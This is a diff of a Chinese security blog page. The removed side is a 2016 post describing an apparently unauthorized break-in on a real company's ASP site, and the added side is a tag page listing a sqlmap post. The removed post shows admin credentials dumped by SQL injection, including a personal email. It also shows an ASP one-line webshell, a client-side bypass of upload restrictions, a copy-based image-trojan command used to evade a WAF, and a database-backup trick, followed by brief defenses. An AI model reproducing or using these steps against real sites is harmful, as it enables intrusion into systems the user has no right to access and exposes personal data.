@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>文件上传实例1 | 大棟哥の博客</title>
+  <title>Tag: tools | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="post-template">
+<body class="home-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -266,62 +266,37 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-<section id="intro">
+
+
+<section id="services">
     <div class="container">
-        <div class="row col-md-offset-2">
-            <div class="col-md-8">
-    			<span class="post-meta">
-      <time datetime="2016-07-23T14:53:42.000Z" itemprop="datePublished">
-          2016-07-23
-      </time>
-    
-    
-    | 
-    <a href='/tags/文件上传/'>文件上传</a>
-    
-    
-</span>
-                <h1>文件上传实例1</h1>
-            </div>
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1">
+                <div class="row boxes">
+                    
+                    
+                        
+                        
+                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
+                            
+                              <h4 class="title"><a href="/2016/07/03/sqlmap参数详解/">sqlmap参数详解</a></h4>
+                            
+                            <p><time datetime="2016-07-02T16:38:31.000Z"><a href="/2016/07/03/sqlmap参数详解/">2016-07-03</a></time></p>
+                        </div>
+                    
+                </div>
+            </div>    
         </div>
-        <div class="col-md-8 col-md-offset-2">
-      		<p>0x00【前言】<br>    文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。文件上传本身是一个正常的业务功能，对于网站来说大多时候确实需要用户上传一些文件，问题是上传一些文件之后服务器怎么处理解析的<br>文件上传后导致的常见的安全问题一般有：<br>1.上传文件是web脚本语言，服务器端的web容器解释并执行了用户上传的脚本，导致代码执行<br>2.上传文件时Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似的方式控制策略文件的情况类似）<br>3.上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行<br>4.上传文件时钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br>0x01【思路】<br>1、找到后台，获取后台权限（sql注入跑出来用户名和密码，只有对网站操作的权限，增删改查文章 ）；<br>2、找上传点，上传webshell，获取网站权限，对脚本文件进行增删改查，获取网站源码；<br>3、服务器权限（本地权限提升，获取服务器权限，可以任意操作）</p>
-<p>0x02【实验目标】<br>mou机电有限公司<br>目标网址：<br><a href="http://www.xxxxx.com/" target="_blank" rel="external">http://www.xxxxx.com/</a><br>网站类型：.asp<br>0x03【信息收集】<br> 前期对目标网站进行信息收集，查找含有注入漏洞的网站，获取目标网站数据库信息，获得管理员账号密码：<br>管理员账号密码（密码MD5加密，需要解一下）:<br>Database: Microsoft_Access_masterdb<br>Table: sysadmin<br>[2 entries]<br>+—-+——————-+——–+———+——————+<br>| id | email             | show   | manager | password         |<br>+—-+——————-+——–+———+——————+<br>| 1  | dddd@gggg.hhh     | -1     | ah21    | 57195x8dd203f33f |<br>| 22 | 105723690@qq.com  | -1     | zs733   | c2a09ce76xxbd06c |<br>+—-+——————-+——–+———+——————+<br>0x04【流程】<br>1、获取后台地址：<br>后台地址：<br><a href="http://www.xxxxxx.com/xxxxxxx/admin/Login.asp" target="_blank" rel="external">http://www.xxxxxx.com/xxxxxxx/admin/Login.asp</a><br>查找后台地址的方法：一种方法是在主站URL后边添加admin、login、login_admin等关键字进行猜解；另一种是使用工具跑后台，如：多线程网站后台扫描工具、御剑等；<br>2、登录后台：<br>前期通过信息收集获得后台登录用户名密码，进行登录，获取后台权限<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png?raw=true" alt="image"><br>3、找上传点，上传shell获得网站权限：<br>上传点，要找那些能够上传文件的地方，一般是新闻发布，产品发布，头像通过查看，网站对上传的文件类型进行了限制：<br>允许的上传文件类型：UpFileType只输入扩展名。每种文件类型用”|”号分开。类型：gif|jpg|bmp|png|swf|doc|rar<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png?raw=true" alt="image"><br>通过firebug将asp类型添加到可上传类型中：<br>修改后的源码：<br>‘&lt;’input id=”UpFileType2” type=”text” readonly=”yes” maxlength=”255” size=”50” value=”gif|jpg|bmp|png|swf|doc|rar|asp” name=”UpFileType”&gt;<br>效果：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png?raw=true" alt="image"><br>在信息添加，页面添加等出发现都可以进行文件上传！<br>4、制作asp马，上传shell<br>asp马：&lt;%eval request(“pass”)%&gt;<br>上传之后获得路径：<br>www.xxxxxx.com/xxxxxxxxx/uploadfiles/20160722091521607.asp<br>使用菜刀连一下，发现连接失败：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png?raw=true" alt="image"><br>访问一下获得的路径，发现连接失败，被防火墙拦了：<br>提示信息如下：<br>您请求的页面包含危险内容，已被网站管理员设置拦截！<br>当前网址：www.xxxxx.com/xxxxxx/uploadfiles/20160722091521607.asp<br>客户端特征：Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0<br>拦截时间：2016-07-22 09:18:39<br>如何解决：普通网站访客，请联系网站管理员；<br>接下来要解决的问题就是绕过防火墙;<br>5、绕过方式：<br>测试1、CMD图片木马制作<br>命令：copy F2.jpg/b+6.asp/a F.jpg<br>上传之后或的路径，可惜还是失败！<br>测试2、修改上传类型<br>测试3、数据库备份功能<br>在页面管理-&gt;添加页面中上传一个图片马、获得其路径，在系统管理—&gt;数据库备份中，备份数据库！如下图：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png?raw=true" alt="image"><br>0x05【防御】<br>1.文件上传的目录设为不可执行；<br>2.判断文件类型；<br>3.使用随机数改写文件名和文件路径；<br>4.单独设置文件服务器的域名。</p>
+    </div>
+</section> 
 
-            <div class="clearfix"></div>
-            <hr class="nogutter">
+<section id="statement">
+    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
+        <div class="row">
+            <p>业精于勤，荒于嬉；行成于思，毁于随。</p>
         </div>
-        <nav class="pagination" role="pagination">
-    
-    <a class="pull-left" href="/2016/07/24/lenovo-z510-ssd/" style="float: left;">
-        ← lenovo z510 ssd
-    </a>
-    
-    
-    <a class="pull-right" href="/2016/07/21/XSS01/">
-        XSS实例1 →
-    </a>
-    
-</nav>
-
-        <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/07/23/文件上传实例1/" data-title="文件上传实例1" data-url="http://www.jiadong.xin/2016/07/23/文件上传实例1/"></div>
-<script type="text/javascript">
-var duoshuoQuery = {short_name:"duoshuo_name"};
-(function() {
-	var ds = document.createElement('script');
-	ds.type = 'text/javascript';ds.async = true;
-	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-	ds.charset = 'UTF-8';
-	(document.getElementsByTagName('head')[0] 
-	 || document.getElementsByTagName('body')[0]).appendChild(ds);
-})();
-</script>
-</div>
     </div>
 </section>
-
-
       
 <!-- ============================ Footer =========================== -->
 
